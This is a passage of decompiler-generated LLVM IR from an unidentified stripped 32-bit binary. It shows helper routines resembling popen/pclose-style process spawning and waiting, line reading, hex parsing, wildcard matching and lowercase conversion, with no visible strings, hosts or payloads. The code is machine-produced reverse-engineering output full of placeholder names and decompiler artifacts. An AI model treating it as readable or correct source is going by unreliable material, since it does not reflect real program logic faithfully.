dec_label_pc_8048c51:                             ; preds = %dec_label_pc_8048c48, %dec_label_pc_8048c38
  %v1_8048c54 = add i32 %v4_8048c3f, 1
  %v1_8048c55 = inttoptr i32 %v1_8048c54 to i8*
  %v2_8048c55 = load i8, i8* %v1_8048c55, align 1
  %v4_8048c57 = icmp eq i8 %v2_8048c55, 0
  br i1 %v4_8048c57, label %dec_label_pc_8048c67, label %dec_label_pc_8048e26

dec_label_pc_8048c67:                             ; preds = %dec_label_pc_8048c51
  %v2_8048c6a = ptrtoint i32* %stack_var_-24 to i32
  %v1_8048c6e = call i32 @function_8050348(i32 %v2_8048c6a)
  %v2_8048c76 = icmp slt i32 %v1_8048c6e, 0
  %v1_8048c78 = icmp eq i1 %v2_8048c76, false
  br i1 %v1_8048c78, label %dec_label_pc_8048c86, label %dec_label_pc_8048e26

dec_label_pc_8048c86:                             ; preds = %dec_label_pc_8048c67
  %v0_8048c86 = load i8*, i8** @global_var_80618e0.25, align 4
  %v2_8048c8b = icmp eq i8* %v0_8048c86, null
  %v1_8048c8d = icmp eq i1 %v2_8048c8b, false
  br i1 %v1_8048c8d, label %bb, label %dec_label_pc_8048c8f

dec_label_pc_8048c8f:                             ; preds = %dec_label_pc_8048c86
  %v0_8048c8f = call i32 @function_80501c4()
  %tmp33 = icmp slt i32 %v0_8048c8f, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_8048ca9, label %dec_label_pc_8048e26

dec_label_pc_8048ca9:                             ; preds = %dec_label_pc_8048c8f
  %v2_8048cac = mul i32 %v0_8048c8f, 4
  %v1_8048cb3 = call i32 @function_8051f6a(i32 %v2_8048cac)
  %v1_8048cbb = inttoptr i32 %v1_8048cb3 to i8*
  store i8* %v1_8048cbb, i8** @global_var_80618e0.25, align 32
  %v2_8048cc5 = icmp eq i32 %v1_8048cb3, 0
  %v1_8048cc7 = icmp eq i1 %v2_8048cc5, false
  br i1 %v1_8048cc7, label %dec_label_pc_8048cd5, label %dec_label_pc_8048e26

dec_label_pc_8048cd5:                             ; preds = %dec_label_pc_8048ca9
  %v1_8048cd8 = mul i32 %v0_8048c8f, 4
  store i32 %v1_8048cb3, i32* @edi, align 4
  %v1_8048ce9 = and i32 %v1_8048cb3, -256
  %v5_8048ceb = call i8* @_memset(i8* %v1_8048cbb, i32 %v1_8048ce9, i32 %v1_8048cd8)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048c86, %dec_label_pc_8048cd5
  %v0_8048ced = call i32 @function_804fffc()
  %v13_8048cfb = icmp eq i32 %v0_8048ced, -1
  br i1 %v13_8048cfb, label %dec_label_pc_8048d0c, label %dec_label_pc_8048d01

dec_label_pc_8048d01:                             ; preds = %bb
  %v4_8048d01 = icmp eq i32 %v0_8048ced, 0
  %v2_8048d39 = load i8, i8* %arg2, align 1
  %v10_8048d3b = icmp eq i8 %v2_8048d39, 114
  %v1_8048d3d = icmp eq i1 %v10_8048d3b, false
  br i1 %v4_8048d01, label %dec_label_pc_8048d36, label %dec_label_pc_8048dd7

dec_label_pc_8048d0c:                             ; preds = %bb
  %v3_8048d0c = load i32, i32* %stack_var_-24, align 4
  %v1_8048d13 = call i32 @function_8050138(i32 %v3_8048d0c)
  %v1_8048d22 = call i32 @function_8050138(i32 %tmp15)
  br label %dec_label_pc_8048e26

dec_label_pc_8048d36:                             ; preds = %dec_label_pc_8048d01
  br i1 %v1_8048d3d, label %dec_label_pc_8048d78, label %dec_label_pc_8048d3f

dec_label_pc_8048d3f:                             ; preds = %dec_label_pc_8048d36
  %v9_8048d42 = icmp eq i32 %tmp15, 1
  br i1 %v9_8048d42, label %dec_label_pc_8048d3f.dec_label_pc_8048d67_crit_edge, label %dec_label_pc_8048d47

dec_label_pc_8048d3f.dec_label_pc_8048d67_crit_edge: ; preds = %dec_label_pc_8048d3f
  br label %dec_label_pc_8048d67

dec_label_pc_8048d47:                             ; preds = %dec_label_pc_8048d3f
  %v2_8048d50 = call i32 @function_8050168(i32 %tmp15, i32 1)
  %v1_8048d5f = call i32 @function_8050138(i32 %tmp15)
  br label %dec_label_pc_8048d67

dec_label_pc_8048d67:                             ; preds = %dec_label_pc_8048d3f.dec_label_pc_8048d67_crit_edge, %dec_label_pc_8048d47
  %v3_8048d67 = load i32, i32* %stack_var_-24, align 4
  %v1_8048d6e = call i32 @function_8050138(i32 %v3_8048d67)
  br label %dec_label_pc_8048dae

dec_label_pc_8048d78:                             ; preds = %dec_label_pc_8048d36
  %v3_8048d78 = load i32, i32* %stack_var_-24, align 4
  %v1_8048d7b = icmp eq i32 %v3_8048d78, 0
  br i1 %v1_8048d7b, label %dec_label_pc_8048d78.dec_label_pc_8048d9f_crit_edge, label %dec_label_pc_8048d7f

dec_label_pc_8048d78.dec_label_pc_8048d9f_crit_edge: ; preds = %dec_label_pc_8048d78
  br label %dec_label_pc_8048d9f

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048d78
  %v2_8048d88 = call i32 @function_8050168(i32 %v3_8048d78, i32 0)
  %v3_8048d90 = load i32, i32* %stack_var_-24, align 4
  %v1_8048d97 = call i32 @function_8050138(i32 %v3_8048d90)
  br label %dec_label_pc_8048d9f

dec_label_pc_8048d9f:                             ; preds = %dec_label_pc_8048d78.dec_label_pc_8048d9f_crit_edge, %dec_label_pc_8048d7f
  %v1_8048da6 = call i32 @function_8050138(i32 %tmp15)
  br label %dec_label_pc_8048dae

dec_label_pc_8048dae:                             ; preds = %dec_label_pc_8048d67, %dec_label_pc_8048d9f
  %v8_8048dc5 = call i32 @function_8053250(i32 ptrtoint ([8 x i8]* @global_var_8059ae2.28 to i32), i32 ptrtoint ([3 x i8]* @global_var_8059597.27 to i32), i32 ptrtoint ([3 x i8]* @global_var_8059adf.26 to i32), i32 %arg1, i32 0)
  %v1_8048dd2 = call i32 @function_80500ac(i32 127)
  unreachable

dec_label_pc_8048dd7:                             ; preds = %dec_label_pc_8048d01
  br i1 %v1_8048d3d, label %dec_label_pc_8048df7, label %dec_label_pc_8048de0

dec_label_pc_8048de0:                             ; preds = %dec_label_pc_8048dd7
  %v3_8048de0 = load i32, i32* %stack_var_-24, align 4
  %v1_8048ded = call i32 @function_8050138(i32 %tmp15)
  br label %dec_label_pc_8048e0c

dec_label_pc_8048df7:                             ; preds = %dec_label_pc_8048dd7
  %v3_8048dfd = load i32, i32* %stack_var_-24, align 4
  %v1_8048e04 = call i32 @function_8050138(i32 %v3_8048dfd)
  br label %dec_label_pc_8048e0c

dec_label_pc_8048e0c:                             ; preds = %dec_label_pc_8048de0, %dec_label_pc_8048df7
  %stack_var_-28.0 = phi i32 [ %v3_8048de0, %dec_label_pc_8048de0 ], [ %tmp15, %dec_label_pc_8048df7 ]
  %v2_8048e0f = mul i32 %stack_var_-28.0, 4
  %v0_8048e14 = load i8*, i8** @global_var_80618e0.25, align 4
  %v1_8048e14 = ptrtoint i8* %v0_8048e14 to i32
  %v2_8048e19 = add i32 %v1_8048e14, %v2_8048e0f
  %v2_8048e1e = inttoptr i32 %v2_8048e19 to i32*
  store i32 %v0_8048ced, i32* %v2_8048e1e, align 4
  br label %dec_label_pc_8048e26

dec_label_pc_8048e26:                             ; preds = %dec_label_pc_8048ca9, %dec_label_pc_8048c8f, %dec_label_pc_8048c67, %dec_label_pc_8048c48, %dec_label_pc_8048c51, %dec_label_pc_8048d0c, %dec_label_pc_8048e0c
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048d0c ], [ %stack_var_-28.0, %dec_label_pc_8048e0c ], [ -1, %dec_label_pc_8048c51 ], [ -1, %dec_label_pc_8048c48 ], [ -1, %dec_label_pc_8048c67 ], [ -1, %dec_label_pc_8048c8f ], [ -1, %dec_label_pc_8048ca9 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_8048ced, { 1, 2, 0 }
  uselistorder i32 %v1_8048cb3, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8048c8f, { 2, 0, 1 }
  uselistorder i32 %tmp15, { 1, 6, 3, 4, 5, 0, 2 }
  uselistorder i32 (i32, i32)* @function_8050168, { 1, 0 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048e26, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048e0c, { 1, 0 }
  uselistorder label %dec_label_pc_8048dae, { 1, 0 }
  uselistorder label %dec_label_pc_8048d9f, { 1, 0 }
  uselistorder label %dec_label_pc_8048d67, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_8048e2e(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048e2e:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %v0_8048e37 = load i8*, i8** @global_var_80618e0.25, align 4
  %v2_8048e3c = icmp eq i8* %v0_8048e37, null
  br i1 %v2_8048e3c, label %dec_label_pc_8048f8a, label %dec_label_pc_8048e40

dec_label_pc_8048e40:                             ; preds = %dec_label_pc_8048e2e
  %v1_8048e37 = ptrtoint i8* %v0_8048e37 to i32
  %v2_8048e43 = mul i32 %arg1, 4
  %v2_8048e4d = add i32 %v1_8048e37, %v2_8048e43
  %v1_8048e50 = inttoptr i32 %v2_8048e4d to i32*
  %v2_8048e50 = load i32, i32* %v1_8048e50, align 4
  %v1_8048e52 = icmp eq i32 %v2_8048e50, 0
  %v1_8048e54 = icmp eq i1 %v1_8048e52, false
  br i1 %v1_8048e54, label %dec_label_pc_8048e65, label %dec_label_pc_8048f8a

dec_label_pc_8048e65:                             ; preds = %dec_label_pc_8048e40
  %v1_8048e6b = call i32 @function_8050138(i32 %arg1)
  %v2_8048e76 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048e7d = call i32 @function_8051e14(i32 %v2_8048e76)
  %v2_8048e91 = call i32 @function_8051de8(i32 %v2_8048e76, i32 2)
  %v2_8048ea5 = call i32 @function_8051de8(i32 %v2_8048e76, i32 3)
  %v2_8048eb9 = call i32 @function_8051de8(i32 %v2_8048e76, i32 1)
  %v2_8048ec4 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048ed4 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048ed4 = call i32 @function_8050458(i32 0, %_TYPEDEF_sigset_t* %v3_8048ed4, i32 %v2_8048ec4)
  %v2_8048ef3 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048edc

dec_label_pc_8048edc:                             ; preds = %dec_label_pc_8048f12, %dec_label_pc_8048e65
  %v0_8048ee4 = load i8*, i8** @global_var_80618e0.25, align 4
  %v1_8048ee4 = ptrtoint i8* %v0_8048ee4 to i32
  %v2_8048ee9 = add i32 %v1_8048ee4, %v2_8048e43
  %v1_8048eec = inttoptr i32 %v2_8048ee9 to i32*
  %v2_8048eec = load i32, i32* %v1_8048eec, align 4
  %v3_8048efb = call i32 @function_80504e0(i32 %v2_8048eec, i32 %v2_8048ef3, i32 0)
  %v13_8048f09 = icmp eq i32 %v3_8048efb, -1
  %v1_8048f10 = icmp eq i1 %v13_8048f09, false
  br i1 %v1_8048f10, label %dec_label_pc_8048f1e, label %dec_label_pc_8048f12

dec_label_pc_8048f12:                             ; preds = %dec_label_pc_8048edc
  %v1_8048f12 = call i32 @function_8050568(i32 %v3_8048efb)
  %v1_8048f17 = inttoptr i32 %v1_8048f12 to i32*
  %v2_8048f17 = load i32, i32* %v1_8048f17, align 4
  %v9_8048f19 = icmp eq i32 %v2_8048f17, 4
  br i1 %v9_8048f19, label %dec_label_pc_8048edc, label %dec_label_pc_8048f1e

dec_label_pc_8048f1e:                             ; preds = %dec_label_pc_8048f12, %dec_label_pc_8048edc
  %v13_8048f09.lcssa = phi i1 [ false, %dec_label_pc_8048edc ], [ true, %dec_label_pc_8048f12 ]
  %v3_8048f2c = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048f2c = call i32 @function_8050458(i32 2, %_TYPEDEF_sigset_t* %v3_8048f2c, i32 0)
  %v2_8048f3a = mul i32 %tmp8, 4
  %v0_8048f3f = load i8*, i8** @global_var_80618e0.25, align 4
  %v1_8048f3f = ptrtoint i8* %v0_8048f3f to i32
  %v2_8048f44 = add i32 %v1_8048f3f, %v2_8048f3a
  %v1_8048f47 = inttoptr i32 %v2_8048f44 to i32*
  store i32 0, i32* %v1_8048f47, align 4
  br i1 %v13_8048f09.lcssa, label %dec_label_pc_8048f7e, label %dec_label_pc_8048f56

dec_label_pc_8048f56:                             ; preds = %dec_label_pc_8048f1e
  %v3_8048f56 = load i32, i32* %stack_var_-268, align 4
  %v1_8048f62 = and i32 %v3_8048f56, 65280
  %v2_8048f691 = udiv i32 %v1_8048f62, 256
  br label %dec_label_pc_8048f7e

dec_label_pc_8048f7e:                             ; preds = %dec_label_pc_8048f1e, %dec_label_pc_8048f56
  %storemerge2 = phi i32 [ %v2_8048f691, %dec_label_pc_8048f56 ], [ -1, %dec_label_pc_8048f1e ]
  br label %dec_label_pc_8048f8a

dec_label_pc_8048f8a:                             ; preds = %dec_label_pc_8048e2e, %dec_label_pc_8048e40, %dec_label_pc_8048f7e
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048f7e ], [ -1, %dec_label_pc_8048e40 ], [ -1, %dec_label_pc_8048e2e ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048efb, { 1, 0 }
  uselistorder i32 %v2_8048e43, { 1, 0 }
  uselistorder i8* %v0_8048e37, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8051de8, { 2, 1, 0 }
  uselistorder i8** @global_var_80618e0.25, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048f8a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048f7e, { 1, 0 }
}

define i32 @function_8048f92(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8048f92:
  br label %dec_label_pc_8048fcb

dec_label_pc_8048fa8:                             ; preds = %dec_label_pc_8048fd3
  %v3_8048fb7 = inttoptr i32 %v5_8048fd6 to i32*
  %v4_8048fb7 = call i32 @function_80503b8(i32 %arg3, i32* %v3_8048fb7, i32 1)
  %v4_8048fc2 = add nuw i32 %storemerge115, 1
  %v8_8048fc5 = icmp eq i32 %v4_8048fb7, 0
  %v12_8048fc5 = icmp eq i32 %v4_8048fb7, 1
  %v1_8048fc9 = icmp eq i1 %v12_8048fc5, false
  br i1 %v1_8048fc9, label %dec_label_pc_8048fe0, label %dec_label_pc_8048fcb

dec_label_pc_8048fcb:                             ; preds = %dec_label_pc_8048f92, %dec_label_pc_8048fa8
  %v8_8048fc516 = phi i1 [ false, %dec_label_pc_8048f92 ], [ %v8_8048fc5, %dec_label_pc_8048fa8 ]
  %storemerge115 = phi i32 [ 0, %dec_label_pc_8048f92 ], [ %v4_8048fc2, %dec_label_pc_8048fa8 ]
  %v5_8048fd1 = icmp slt i32 %storemerge115, %arg2
  br i1 %v5_8048fd1, label %dec_label_pc_8048fd3, label %dec_label_pc_8048fe0

dec_label_pc_8048fd3:                             ; preds = %dec_label_pc_8048fcb
  %v5_8048fd6 = add i32 %storemerge115, %arg1
  %v1_8048fd9 = add i32 %v5_8048fd6, -1
  %v1_8048fda = inttoptr i32 %v1_8048fd9 to i8*
  %v2_8048fda = load i8, i8* %v1_8048fda, align 1
  %v10_8048fdc = icmp eq i8 %v2_8048fda, 10
  %v1_8048fde = icmp eq i1 %v10_8048fdc, false
  br i1 %v1_8048fde, label %dec_label_pc_8048fa8, label %dec_label_pc_8048fe0

dec_label_pc_8048fe0:                             ; preds = %dec_label_pc_8048fcb, %dec_label_pc_8048fd3, %dec_label_pc_8048fa8
  %v8_8048fc5.lcssa = phi i1 [ %v8_8048fc516, %dec_label_pc_8048fcb ], [ %v8_8048fc516, %dec_label_pc_8048fd3 ], [ %v8_8048fc5, %dec_label_pc_8048fa8 ]
  br i1 %v8_8048fc5.lcssa, label %dec_label_pc_8048ff5, label %dec_label_pc_8048fe6

dec_label_pc_8048fe6:                             ; preds = %dec_label_pc_8048fe0
  br label %dec_label_pc_8048ff5

dec_label_pc_8048ff5:                             ; preds = %dec_label_pc_8048fe0, %dec_label_pc_8048fe6
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048fe6 ], [ 0, %dec_label_pc_8048fe0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048fd6, { 1, 0 }
  uselistorder i32 %storemerge115, { 2, 0, 1 }
  uselistorder i1 %v8_8048fc516, { 1, 0 }
  uselistorder i1 %v8_8048fc5, { 1, 0 }
  uselistorder i32 %v4_8048fb7, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048ff5, { 1, 0 }
  uselistorder label %dec_label_pc_8048fe0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048fcb, { 1, 0 }
}

define i32 @function_8048ffa(i8* %arg1) local_unnamed_addr {
dec_label_pc_8048ffa:
  %v4_804902a5 = ptrtoint i8* %arg1 to i32
  %v2_804902d6 = load i8, i8* %arg1, align 1
  %v4_804902f10 = icmp eq i8 %v2_804902d6, 0
  br i1 %v4_804902f10, label %dec_label_pc_8049039, label %dec_label_pc_8049033

dec_label_pc_8049009:                             ; preds = %dec_label_pc_8049033
  %v2_804900e = mul i32 %stack_var_-8.011, 16
  %v2_8049014 = load i8, i8* %stack_var_4.012, align 1
  %v3_8049014 = zext i8 %v2_8049014 to i32
  %v1_804901b = mul nuw nsw i32 %v3_8049014, 4
  %v2_804901b = add i32 %v1_804901b, ptrtoint (i32* @global_var_8059b00.29 to i32)
  %v3_804901b = inttoptr i32 %v2_804901b to i32*
  %v4_804901b = load i32, i32* %v3_804901b, align 4
  %v2_8049022 = or i32 %v4_804901b, %v2_804900e
  %v5_8049027 = add i32 %v4_804902a13, 1
  %v22_8049027 = inttoptr i32 %v5_8049027 to i8*
  %v2_804902d = load i8, i8* %v22_8049027, align 1
  %v4_804902f = icmp eq i8 %v2_804902d, 0
  br i1 %v4_804902f, label %dec_label_pc_8049039, label %dec_label_pc_8049033

dec_label_pc_8049033:                             ; preds = %dec_label_pc_8048ffa, %dec_label_pc_8049009
  %v4_804902a13 = phi i32 [ %v5_8049027, %dec_label_pc_8049009 ], [ %v4_804902a5, %dec_label_pc_8048ffa ]
  %stack_var_4.012 = phi i8* [ %v22_8049027, %dec_label_pc_8049009 ], [ %arg1, %dec_label_pc_8048ffa ]
  %stack_var_-8.011 = phi i32 [ %v2_8049022, %dec_label_pc_8049009 ], [ 0, %dec_label_pc_8048ffa ]
  %v5_8049033 = icmp slt i32 %stack_var_-8.011, 0
  %v1_8049037 = icmp eq i1 %v5_8049033, false
  br i1 %v1_8049037, label %dec_label_pc_8049009, label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8049009, %dec_label_pc_8049033, %dec_label_pc_8048ffa
  %stack_var_-8.0.lcssa = phi i32 [ 0, %dec_label_pc_8048ffa ], [ %stack_var_-8.011, %dec_label_pc_8049033 ], [ %v2_8049022, %dec_label_pc_8049009 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.011, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049039, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049033, { 1, 0 }
}

define i32 @function_804903e(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804903e:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %v0_8049041 = load i32, i32* @ebx, align 4
  %v4_8049045 = ptrtoint i8* %arg1 to i32
  %v2_8049048 = load i8, i8* %arg1, align 1
  %v12_8049054 = icmp eq i8 %v2_8049048, 42
  br i1 %v12_8049054, label %dec_label_pc_804907f, label %dec_label_pc_804905a

dec_label_pc_804905a:                             ; preds = %dec_label_pc_804903e
  %v12_804905a = icmp eq i8 %v2_8049048, 63
  br i1 %v12_804905a, label %dec_label_pc_80490d1, label %dec_label_pc_8049060

dec_label_pc_8049060:                             ; preds = %dec_label_pc_804905a
  %v4_8049060 = icmp eq i8 %v2_8049048, 0
  br i1 %v4_8049060, label %dec_label_pc_804906b, label %dec_label_pc_804910b

dec_label_pc_804906b:                             ; preds = %dec_label_pc_8049060
  %v2_804906e = load i8, i8* %tmp14, align 1
  %v3_804906e = zext i8 %v2_804906e to i32
  br label %dec_label_pc_804916c

dec_label_pc_804907f:                             ; preds = %dec_label_pc_804903e
  %v1_8049082 = add i32 %v4_8049045, 1
  %v5_8049089 = inttoptr i32 %v1_8049082 to i8*
  %v5_804908a = call i32 @function_804903e(i8* %v5_8049089, i32 %arg2)
  %v1_8049092 = icmp eq i32 %v5_804908a, 0
  br i1 %v1_8049092, label %dec_label_pc_80490bf, label %dec_label_pc_8049096

dec_label_pc_8049096:                             ; preds = %dec_label_pc_804907f
  %v2_8049099 = load i8, i8* %tmp14, align 1
  %v4_804909b = icmp eq i8 %v2_8049099, 0
  br i1 %v4_804909b, label %dec_label_pc_80490c6, label %dec_label_pc_804909f

dec_label_pc_804909f:                             ; preds = %dec_label_pc_8049096
  %v1_80490a2 = add i32 %arg2, 1
  %v5_80490aa = call i32 @function_804903e(i8* nonnull %arg1, i32 %v1_80490a2)
  %v1_80490b2 = icmp eq i32 %v5_80490aa, 0
  br i1 %v1_80490b2, label %dec_label_pc_80490bf, label %dec_label_pc_80490c6

dec_label_pc_80490bf:                             ; preds = %dec_label_pc_804909f, %dec_label_pc_804907f
  br label %dec_label_pc_80490c6

dec_label_pc_80490c6:                             ; preds = %dec_label_pc_8049096, %dec_label_pc_804909f, %dec_label_pc_80490bf
  %storemerge8 = phi i32 [ 0, %dec_label_pc_80490bf ], [ 1, %dec_label_pc_804909f ], [ 1, %dec_label_pc_8049096 ]
  br label %dec_label_pc_804916c

dec_label_pc_80490d1:                             ; preds = %dec_label_pc_804905a
  %v2_80490d4 = load i8, i8* %tmp14, align 1
  %v4_80490d6 = icmp eq i8 %v2_80490d4, 0
  br i1 %v4_80490d6, label %dec_label_pc_8049103, label %dec_label_pc_80490da

dec_label_pc_80490da:                             ; preds = %dec_label_pc_80490d1
  %v1_80490dd = add i32 %arg2, 1
  %v1_80490e1 = add i32 %v4_8049045, 1
  %v5_80490e6 = inttoptr i32 %v1_80490e1 to i8*
  %v5_80490e7 = call i32 @function_804903e(i8* %v5_80490e6, i32 %v1_80490dd)
  %v1_80490ef = icmp ne i32 %v5_80490e7, 0
  %. = zext i1 %v1_80490ef to i32
  br label %dec_label_pc_8049103

dec_label_pc_8049103:                             ; preds = %dec_label_pc_80490da, %dec_label_pc_80490d1
  %storemerge5 = phi i32 [ 1, %dec_label_pc_80490d1 ], [ %., %dec_label_pc_80490da ]
  br label %dec_label_pc_804916c

dec_label_pc_804910b:                             ; preds = %dec_label_pc_8049060
  %v2_804910e = load i8, i8* %arg1, align 1
  %v3_804910e = zext i8 %v2_804910e to i32
  %v2_8049119 = call i32 @function_8050548(i32 %v3_804910e)
  store i32 %v2_8049119, i32* @ebx, align 4
  %v2_8049126 = load i8, i8* %tmp14, align 1
  %v3_8049126 = zext i8 %v2_8049126 to i32
  %v2_8049131 = call i32 @function_8050548(i32 %v3_8049126)
  %v0_8049139 = load i32, i32* @ebx, align 4
  %v12_8049139 = icmp eq i32 %v0_8049139, %v2_8049131
  %v1_804913b = icmp eq i1 %v12_8049139, false
  br i1 %v1_804913b, label %dec_label_pc_8049166, label %dec_label_pc_804913d

dec_label_pc_804913d:                             ; preds = %dec_label_pc_804910b
  %v1_8049140 = add i32 %arg2, 1
  %v1_8049144 = add i32 %v4_8049045, 1
  %v5_8049149 = inttoptr i32 %v1_8049144 to i8*
  %v5_804914a = call i32 @function_804903e(i8* %v5_8049149, i32 %v1_8049140)
  %v1_8049152 = icmp ne i32 %v5_804914a, 0
  %.9 = zext i1 %v1_8049152 to i32
  br label %dec_label_pc_8049166

dec_label_pc_8049166:                             ; preds = %dec_label_pc_804913d, %dec_label_pc_804910b
  %storemerge = phi i32 [ 1, %dec_label_pc_804910b ], [ %.9, %dec_label_pc_804913d ]
  br label %dec_label_pc_804916c

dec_label_pc_804916c:                             ; preds = %dec_label_pc_8049103, %dec_label_pc_80490c6, %dec_label_pc_804906b, %dec_label_pc_8049166
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_80490c6 ], [ %storemerge5, %dec_label_pc_8049103 ], [ %v3_804906e, %dec_label_pc_804906b ], [ %storemerge, %dec_label_pc_8049166 ]
  store i32 %v0_8049041, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8049048, { 2, 0, 1 }
  uselistorder i32 %v4_8049045, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804916c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80490c6, { 2, 1, 0 }
}

define i32 @function_8049174(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8049174:
  %v1_8049181 = call i32 @function_80518b4(i32 %arg1)
  store i32 %v1_8049181, i32* %arg2, align 4
  %v10_8049195 = icmp eq i32 %v1_8049181, -1
  %. = zext i1 %v10_8049195 to i32
  ret i32 %.
}

define i32 @function_80491af(i8* %arg1) local_unnamed_addr {
dec_label_pc_80491af:
  %stack_var_-4 = alloca i32, align 4
  %v0_80491af = load i32, i32* @ebp, align 4
  store i32 %v0_80491af, i32* %stack_var_-4, align 4
  %v4_80491d76 = ptrtoint i8* %arg1 to i32
  %v2_80491da7 = load i8, i8* %arg1, align 1
  %v3_80491da8 = zext i8 %v2_80491da7 to i32
  %v5_80491da9 = and i32 %v4_80491d76, -256
  %v6_80491da10 = or i32 %v3_80491da8, %v5_80491da9
  %v4_80491dc11 = icmp eq i8 %v2_80491da7, 0
  %v1_80491de12 = icmp eq i1 %v4_80491dc11, false
  br i1 %v1_80491de12, label %dec_label_pc_80491b7, label %dec_label_pc_80491e0

dec_label_pc_80491b7:                             ; preds = %dec_label_pc_80491af, %dec_label_pc_80491b7.dec_label_pc_80491b7_crit_edge
  %v4_80491d714 = phi i32 [ %v5_80491d4, %dec_label_pc_80491b7.dec_label_pc_80491b7_crit_edge ], [ %v4_80491d76, %dec_label_pc_80491af ]
  %stack_var_4.013 = phi i8* [ %v22_80491d4, %dec_label_pc_80491b7.dec_label_pc_80491b7_crit_edge ], [ %arg1, %dec_label_pc_80491af ]
  %v2_80491ba = load i8, i8* %stack_var_4.013, align 1
  %v3_80491ba = zext i8 %v2_80491ba to i32
  %v1_80491c5 = call i32 @function_8050548(i32 %v3_80491ba)
  %v1_80491d2 = trunc i32 %v1_80491c5 to i8
  store i8 %v1_80491d2, i8* %stack_var_4.013, align 1
  %v5_80491d4 = add i32 %v4_80491d714, 1
  %v22_80491d4 = inttoptr i32 %v5_80491d4 to i8*
  %v2_80491da = load i8, i8* %v22_80491d4, align 1
  %v4_80491dc = icmp eq i8 %v2_80491da, 0
  %v1_80491de = icmp eq i1 %v4_80491dc, false
  br i1 %v1_80491de, label %dec_label_pc_80491b7.dec_label_pc_80491b7_crit_edge, label %dec_label_pc_80491d7.dec_label_pc_80491e0_crit_edge

dec_label_pc_80491b7.dec_label_pc_80491b7_crit_edge: ; preds = %dec_label_pc_80491b7
  br label %dec_label_pc_80491b7

dec_label_pc_80491d7.dec_label_pc_80491e0_crit_edge: ; preds = %dec_label_pc_80491b7
  %v3_80491da = zext i8 %v2_80491da to i32
  %v5_80491da = and i32 %v5_80491d4, -256
  %v6_80491da = or i32 %v3_80491da, %v5_80491da
  %v2_80491e0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_80491e0:                             ; preds = %dec_label_pc_80491d7.dec_label_pc_80491e0_crit_edge, %dec_label_pc_80491af
  %v2_80491e0 = phi i32 [ %v2_80491e0.pre, %dec_label_pc_80491d7.dec_label_pc_80491e0_crit_edge ], [ %v0_80491af, %dec_label_pc_80491af ]
  %v6_80491da.lcssa = phi i32 [ %v6_80491da, %dec_label_pc_80491d7.dec_label_pc_80491e0_crit_edge ], [ %v6_80491da10, %dec_label_pc_80491af ]
  store i32 %v2_80491e0, i32* @ebp, align 4
  ret i32 %v6_80491da.lcssa

; uselistorder directives
  uselistorder i8 %v2_80491da, { 1, 0 }
  uselistorder i8* %v22_80491d4, { 1, 0 }
  uselistorder i32 %v5_80491d4, { 1, 2, 0 }
  uselistorder i8* %stack_var_4.013, { 1, 0 }
  uselistorder i32 (i32)* @function_8050548, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80491b7, { 1, 0 }
}

define i32 @function_80491e2(i32 %arg1) local_unnamed_addr {
dec_label_pc_80491e2:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_80491f6 = call i32 @function_80502e4(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059f00.30, i32 0, i32 0), i32 0)
  %v2_8049354 = ptrtoint i32* %stack_var_-4112 to i32
  %tmp34 = bitcast i32* %stack_var_-4112 to i8*
  %v5_804936637 = call i32 @function_8048f92(i32 %v2_8049354, i32 4096, i32 %v5_80491f6)
  %v1_804936e38 = icmp eq i32 %v5_804936637, 0
  %v1_804937039 = icmp eq i1 %v1_804936e38, false
